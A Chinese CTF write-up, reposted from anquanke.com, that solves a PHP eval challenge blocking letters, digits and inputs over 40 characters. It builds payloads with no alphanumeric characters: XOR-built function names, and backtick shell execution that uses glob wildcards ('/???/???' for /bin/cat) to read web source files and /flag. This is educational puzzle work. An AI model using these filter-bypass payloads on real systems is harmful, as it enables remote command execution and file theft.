> 原文链接: https://www.anquanke.com//post/id/154284 


# CTF题目思考--极限利用


                                阅读量   
                                **429480**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">12</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t01433a38e76e65c858.jpg)](https://p2.ssl.qhimg.com/t01433a38e76e65c858.jpg)

朋友丢过来一个题目，说是极限利用，在兴趣的驱使下，看了下这个题目，发现还挺有意思的，这里简单分析分享一下



## 代码

```
&lt;?php
include 'flag.php';
if(isset($_GET['code']))`{`
    $code = $_GET['code'];
    if(strlen($code)&gt;40)`{`
        die("Long.");
    `}`
    if(preg_match("/[A-Za-z0-9]+/",$code))`{`
        die("NO.");
    `}`
    @eval($code);
`}`else`{`
    highlight_file(__FILE__);
`}`
//$hint =  "php function getFlag() to get flag";
?&gt;
```



## 分析

根据代码，我们要满足两个条件：
1. 长度不能大于40
1. 不能包含大小写字母，数字


## 思路一 ————误入歧途

首先根据提示，说的是要执行`getFlag`函数，来拿flag，然后开始构造。<br>
第一个想到的是ph的[博客](https://www.leavesongs.com/penetration/webshell-without-alphanum.html)中曾经提到的不使用字母和数字的webshell：<br>
其中有三种方式：
1. 两个字符串执行异或操作以后，得到的还是一个字符串
1. 位运算里的“取反”，可以使用中文得到所有字符
1. 我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符
根据这个思路，我们选择了一个最短的方式来构造：

```
function u($x)`{`
    return urldecode($x);
`}`
$_=(u('%07')^'`').(u('%05')^'`').(u('%14')^'`').(u('%1B')^']').(u('%0C')^'`').(u('%01')^'`').(u('%07')^'`');
var_dump($_);
//$_();
```

得到的结果是

```
string(7) "getFlag"
```

也就完成了我们的目标，但是当计算了长度以后，发现差不多每一个字符都要用10个左右的长度来构造，这肯定是不行的。所以我们转变了思路。



## 思路二 ———— 突破束缚

为什么我们一定要执行那个函数呢？

> 想起了老师在课堂上说过，Linux下的一切都是文件，那不如去构造一个读文件，或者命令执行来读flag呢

想到这里，逐渐明确了思路，于是开始一点一点构造payload



## 怎么取回结果呢？

要想得到读文件或者命令执行的内容，我们需要一个用来输出的东西，但是我们又没有常规的函数，经过了一段时间的思考，想到了`&lt;?=$_?&gt;`，这个方式。

大家可能在刚开始学开发的时候，做模板渲染，用过这个方法，但是说真的不是很容易想起来，而且关键的是这个方式默认是开着的。



## 怎么执行命令？

既然输出方式有了，那也得有能执行命令或者读文件的地方呀，于是想到了在php题目中经常出现的执行命令的方式`echo `ls`；`。<br>
这样执行命令的方法有了，进行下一步，找flag



## 没有数字字母怎么找到flag呢?

这里也是很有技巧的点，在Linux系统中，是支持正则的，某些你忘记某个字符情况下，你可以使用`? * %`等字符来替代，当然这里想要执行命令，需要极限的利用这个方法，经过测试：

```
/???/??? =&gt; /bin/cat
```

我们找到了这个关键的正则，我们先来读一下源码

```
$_=`/???/???%20/???/???/????/?????.???`;?&gt;&lt;?=$_?&gt;
"/bin/cat /var/www/html/index.php"
```

但是发现超出长度了，然后我们继续缩短长度，想到了用`*`来匹配文件夹下的所有文件：

```
$_=`/???/???%20/???/???/????/*`;?&gt;&lt;?=$_?&gt;
```

这样我们就读到了源码。<br>[![](https://p2.ssl.qhimg.com/t01c839291a64b4e022.png)](https://p2.ssl.qhimg.com/t01c839291a64b4e022.png)



## 获取flag

我们得到了flag.php的源码是：

```
&lt;?php
$FLAG = file_get_contents("/flag");

function getFlag()`{`
    global $FLAG;
    echo $FLAG;
`}`
```

然后我们直接去读flag文件即可：

```
$_=`/???/???%20/????`;?&gt;&lt;?=$_?&gt;
```

[![](https://p3.ssl.qhimg.com/t01e372765e23b1f5e9.png)](https://p3.ssl.qhimg.com/t01e372765e23b1f5e9.png)



## 总结

这个题目出的很有意思，要想做出这个题目，需要很多的技巧和经验，也属于极限利用的一种形式，当然如果有大佬有好的解决思路，也可以评论交流。
